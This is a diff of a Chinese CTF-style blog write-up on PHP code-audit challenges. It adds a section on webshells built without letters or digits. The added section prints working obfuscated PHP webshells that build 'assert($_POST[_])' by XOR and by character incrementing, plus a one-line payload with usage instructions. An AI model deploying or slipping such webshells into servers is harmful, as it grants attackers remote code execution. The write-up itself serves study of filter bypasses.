@@ -42,8 +42,11 @@
 <meta property="og:image" content="http://wp.xiaohuang.vip/p/9/2022/08/22/630330b312792.png">
 <meta property="og:image" content="http://wp.xiaohuang.vip/p/9/2022/08/22/6303339b8c22f.png">
 <meta property="og:image" content="http://wp.xiaohuang.vip/p/9/2022/09/04/631383ee78ce5.png">
+<meta property="og:image" content="http://wp.xiaohuang.vip/p/9/2022/09/04/63145e6aa36a4.png">
+<meta property="og:image" content="http://wp.xiaohuang.vip/p/9/2022/09/04/631464f48c39f.png">
+<meta property="og:image" content="http://wp.xiaohuang.vip/p/9/2022/09/04/63146f2de88a8.png">
 <meta property="article:published_time" content="2022-08-16T16:14:25.000Z">
-<meta property="article:modified_time" content="2022-09-03T16:43:01.908Z">
+<meta property="article:modified_time" content="2022-09-04T09:30:54.305Z">
 <meta property="article:author" content="叶子">
 <meta property="article:tag" content="PHP审计">
 <meta name="twitter:card" content="summary">
@@ -340,7 +343,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-challenge1"><span class="toc-number">1.</span> <span class="toc-text">(1)challenge1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-challenge2"><span class="toc-number">2.</span> <span class="toc-text">(2)challenge2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-challenge3"><span class="toc-number">3.</span> <span class="toc-text">(3)challenge3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-challenge4"><span class="toc-number">4.</span> <span class="toc-text">(4)challenge4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-challenge5"><span class="toc-number">5.</span> <span class="toc-text">(5)challenge5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-challenge6"><span class="toc-number">6.</span> <span class="toc-text">(6)challenge6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-challenge7"><span class="toc-number">7.</span> <span class="toc-text">(7)challenge7</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-challenge1"><span class="toc-number">1.</span> <span class="toc-text">(1)challenge1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-challenge2"><span class="toc-number">2.</span> <span class="toc-text">(2)challenge2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-challenge3"><span class="toc-number">3.</span> <span class="toc-text">(3)challenge3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-challenge4"><span class="toc-number">4.</span> <span class="toc-text">(4)challenge4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-challenge5"><span class="toc-number">5.</span> <span class="toc-text">(5)challenge5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-challenge6"><span class="toc-number">6.</span> <span class="toc-text">(6)challenge6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-challenge7"><span class="toc-number">7.</span> <span class="toc-text">(7)challenge7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-challenge8"><span class="toc-number">8.</span> <span class="toc-text">(8)challenge8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell"><span class="toc-number">8.1.</span> <span class="toc-text">无字母数字webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-a-b"><span class="toc-number">8.1.1.</span> <span class="toc-text">a.异或运算(a^b)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b-%E8%87%AA%E5%A2%9E"><span class="toc-number">8.1.2.</span> <span class="toc-text">b.自增</span></a></li></ol></li></ol></li></ol>
     </nav>
   </div>
 </aside>
@@ -384,10 +387,10 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/08/17/PHP-Code-Challenge/#comments" class="article-comment-link">评论</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.7k(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.6k(字)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 7(分)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 12(分)</span>
 	
 
       </div>
@@ -509,6 +512,34 @@
 <p>$flag&#x3D;aaa</p>
 <p>之后执行到die($_200)输出$_200就会是flag值</p>
 <p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631383ee78ce5.png" alt="QQ截图20220904004209.png"></p>
+<h2 id="8-challenge8"><a href="#8-challenge8" class="headerlink" title="(8)challenge8"></a>(8)challenge8</h2><p>下载环境</p>
+<p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63145e6aa36a4.png" alt="QQ截图20220904161416.png"></p>
+<p>前置知识:</p>
+<h3 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h3><p>我们有时候会遇到正则将字母数字都过滤的情况这个时候如果要webshell的时候我们就需要编写一个无字母数字的webshell</p>
+<p>这里的思路是通过非字母数字的字符经过变化然后构造出我们想要字母然后再利用PHP动态函数(<strong>file_put_contents</strong>,    <strong>assert</strong>(要注意php7中无法以一个动态函数运行),<strong>system</strong>)进行动态执行</p>
+<p>而这里我们就要考虑如何通过非字母数字的字符来变化得到我们想要的字母</p>
+<h4 id="a-异或运算-a-b"><a href="#a-异或运算-a-b" class="headerlink" title="a.异或运算(a^b)"></a>a.异或运算(a^b)</h4><p>首先了解一下异或运算的运算原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;B&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//(1)首先会先将左右字符转换为ascii值  B---66       ?----63</span><br><span class="line">//(2)第二部会将其ascii值转换为二进制  66--1000010   63--0111111</span><br><span class="line">//(3)第三步会进行二进制异或处理（每位对比相同为0不同为1）： 1111101</span><br><span class="line">//(4)第三步将二进制转为ascii字符：&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631464f48c39f.png" alt="QQ截图20220904164221.png"></p>
+<p>通过这种方法我们就可以做到异或出动态函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure>
+
+<p>应用的时候只需要将其整理到url栏中并post传入_&#x3D;’命令’即可</p>
+<h4 id="b-自增"><a href="#b-自增" class="headerlink" title="b.自增"></a>b.自增</h4><p>在php种我们进行自增的时候可以对应ascii自增获取下一个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;a&#x27;++---&gt;&#x27;b&#x27;   </span><br><span class="line">&#x27;A&#x27;++---&gt;&#x27;B&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>所以当我们表示出a和A的时候通过自增我们就可以获得到所有字母达到绕过</p>
+<p>所以我们这里就要考虑去哪里获取a和A（同时我们要不能涉及字母）</p>
+<p>这里我们考虑到php种当我们将字符串和数组强制连接的时候会转换字符串值Array，这样我们就得到了a和A</p>
+<p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63146f2de88a8.png" alt="QQ截图20220904172559.png"></p>
+<p>更具这种方法即可进行绕过这里放上p神的websehll</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>
+
+<p>应用的时候只需要将其整理到url栏中并post传入_&#x3D;’命令’即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>
+
+<p>参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>
 
       
     </div>
